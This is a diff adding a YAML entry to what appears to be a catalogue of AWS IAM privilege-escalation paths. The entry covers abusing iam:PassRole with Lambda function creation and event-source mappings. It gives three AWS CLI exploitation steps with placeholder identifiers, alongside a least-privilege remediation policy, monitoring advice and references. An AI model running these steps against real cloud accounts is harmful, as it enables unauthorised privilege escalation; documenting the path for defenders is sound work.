@@ -1,0 +1,83 @@
+id: lambda-002
+name: iam:PassRole + lambda:CreateFunction + lambda:CreateEventSourceMapping
+category: service-passrole
+services:
+- iam
+- lambda
+description: A principal with `iam:PassRole`, `lambda:CreateFunction`, and `lambda:CreateEventSourceMapping` can create a Lambda function with a privileged role and configure it to be automatically triggered by an event source (such as DynamoDB streams, Kinesis, or SQS). This allows the attacker to execute code with elevated privileges without manually invoking the function.
+prerequisites:
+  admin:
+  - A role must exist that trusts lambda.amazonaws.com to assume it
+  - The role must have administrative permissions (e.g., AdministratorAccess)
+  - An event source must exist (DynamoDB stream, Kinesis stream, or SQS queue)
+  lateral:
+  - A role must exist that trusts lambda.amazonaws.com to assume it
+  - An event source must exist (DynamoDB stream, Kinesis stream, or SQS queue)
+exploitationSteps:
+  awscli:
+  - step: 1
+    command: |
+      aws lambda create-function --function-name privesc-triggered \
+        --runtime python3.9 --role arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \
+        --handler index.handler --zip-file fileb://exploit.zip
+    description: Create a Lambda function with the privileged role
+  - step: 2
+    command: |
+      aws lambda create-event-source-mapping --function-name privesc-triggered \
+        --event-source-arn arn:aws:dynamodb:REGION:ACCOUNT_ID:table/TABLE_NAME/stream/STREAM_ID \
+        --starting-position LATEST
+    description: Configure the function to be triggered automatically by an event source
+  - step: 3
+    command: aws dynamodb put-item --table-name TABLE_NAME --item '{"id":{"S":"trigger"}}'
+    description: Trigger the function by adding an item to the DynamoDB table
+recommendation: |
+  Restrict the `iam:PassRole` permission using the principle of least privilege.
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:PassRole",
+    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificLambdaRole",
+    "Condition": {
+      "StringEquals": {
+        "iam:PassedToService": "lambda.amazonaws.com"
+      }
+    }
+  }
+  ```
+
+  Additional controls:
+  - Restrict `lambda:CreateEventSourceMapping` permissions
+  - Monitor CloudTrail for Lambda function creation with event source mappings
+  - Alert on Lambda functions with privileged roles being created
+  - Implement resource-based policies on event sources
+discoveredBy:
+  name: Spencer Gietzen
+  organization: Rhino Security Labs
+  date: '2019'
+references:
+- title: AWS Privilege Escalation Methods and Mitigation
+  url: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
+- title: IAM Vulnerable - Lambda PassRole with Trigger
+  url: https://github.com/BishopFox/iam-vulnerable
+relatedPaths:
+- lambda-001
+- lambda-003
+toolSupport:
+  pmapper: true
+  iamVulnerable: true
+permissions:
+  required:
+  - permission: iam:PassRole
+    resourceConstraints: Target role ARN must be in the Resource section
+  - permission: lambda:CreateFunction
+    resourceConstraints: Must have permission to create Lambda functions
+  - permission: lambda:CreateEventSourceMapping
+    resourceConstraints: Must have permission to create event source mappings
+  additional:
+  - permission: iam:ListRoles
+    resourceConstraints: Helpful for discovering available roles to pass
+  - permission: iam:GetRole
+    resourceConstraints: Useful for viewing role trust policies and attached permissions
+  - permission: dynamodb:PutItem
+    resourceConstraints: Depending on what event source you configured, you might need permission to trigger it. We're using dynamodb:PutItem here only as an example. Ideally you will create an event source for something that is already happening so that you don't have to do anything manually. 
